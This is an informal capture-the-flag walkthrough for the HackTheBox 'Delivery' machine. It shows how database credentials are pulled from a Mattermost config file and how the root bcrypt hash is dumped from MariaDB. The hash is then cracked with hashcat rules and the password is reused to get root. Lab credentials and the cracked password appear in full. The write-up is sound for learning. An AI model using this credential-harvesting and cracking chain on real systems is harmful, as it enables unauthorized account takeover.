Now Since We got user a wise man known as ippsec has passed on the knowledge to do a sudo -i and a sudo -l every time you get a user so lets to exactly that( `plus this is ippsec's box` ). and sadly we get nothing
```bash
maildeliverer@Delivery:~$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for maildeliverer: 
Sorry, user maildeliverer may not run sudo on Delivery.
maildeliverer@Delivery:~$ sudo -i
[sudo] password for maildeliverer: 
maildeliverer is not in the sudoers file.  This incident will be reported.
maildeliverer@Delivery:~$ 
maildeliverer@Delivery:~$ 
```
## Sql Enumeration and Exploitation
ok but in the chat we found out that a password hash may be a varient so lets look for a hash. after looking around in the box we see that there a mysql server running and that there is a mattermost config file so lets look through that after looking we find some sql config AND SOME CREDS!!!
```bash
maildeliverer@Delivery:/opt/mattermost/config$ cat config.json | grep sql -B5 -A5
        "DesktopMinVersion": "",
        "IosLatestVersion": "",
        "IosMinVersion": ""
    },
    "SqlSettings": {
        "DriverName": "mysql",
        "DataSource": "mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s",
        "DataSourceReplicas": [],
        "DataSourceSearchReplicas": [],
        "MaxIdleConns": 20,
        "ConnMaxLifetimeMilliseconds": 3600000,
maildeliverer@Delivery:/opt/mattermost/config$ 

```
ok so now lets start looking through the data base... after some looking i can see there is a Users Table so lets see if there is a root hash there... AND THERE IS!!!
```sql
maildeliverer@Delivery:/opt/mattermost/config$ mysql -u mmuser -D mattermost -p
Enter password: 
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 65
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [mattermost]> SELECT username, password FROM Users WHERE username = 'root';
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| root     | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO |
+----------+--------------------------------------------------------------+
1 row in set (0.001 sec)

MariaDB [mattermost]> 

```
## Cracking With Hashcat
ok so have a hash now lets use that hash with the rule `PleaseSubscribe!` But first we need to find the hash type, i personally like to use hashid so fire it up and lets get to pwning. ok so we get that this is a bcrypt type now that we know lets get to pwning...
```shell
┌─[user@parrot-virtual]─[~]
└──╼ $hashid
$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO
Analyzing '$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO'
[+] Blowfish(OpenBSD) 
[+] Woltlab Burning Board 4.x 
[+] bcrypt 
```
Also we need some rule so lets just get some, I generally use this one /usr/share/hashcat/rules/best64.rule which is normally on your computer
so lets crack, `Also remember to put the hash into a file called hash and put "PleaseSubscribe!" into a file called wordlist.txt`
```bash
hashcat -a 0 -m 3200 hash.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule -o cracked.txt -w 3 -O --show
```
and your output should be
```bash
┌─[user@parrot-virtual]─[~/HackTheBox/Delivery/cracking]
└──╼ $hashcat -a 0 -m 3200 hash.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule -o cracked.txt -w 3 -O --show
┌─[user@parrot-virtual]─[~/HackTheBox/Delivery/cracking]
└──╼ $cat cracked.txt
$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21
┌─[user@parrot-virtual]─[~/HackTheBox/Delivery/cracking]
└──╼ $
```
And now we have cracked the password for the MatterMost root accountbut lets just hope its the same for the system account...  and YES IT IS
```bash
maildeliverer@Delivery:~$ su root
Password: 
root@Delivery:/home/maildeliverer# cd ~
root@Delivery:~# ls
mail.sh  note.txt  py-smtp.py  root.txt
root@Delivery:~# 
```
![[Pasted image 20210405154924.png]]
### Thank You For Reading And Remeber `Dont Hate The Hacker Hate The Code`
## BYE!!!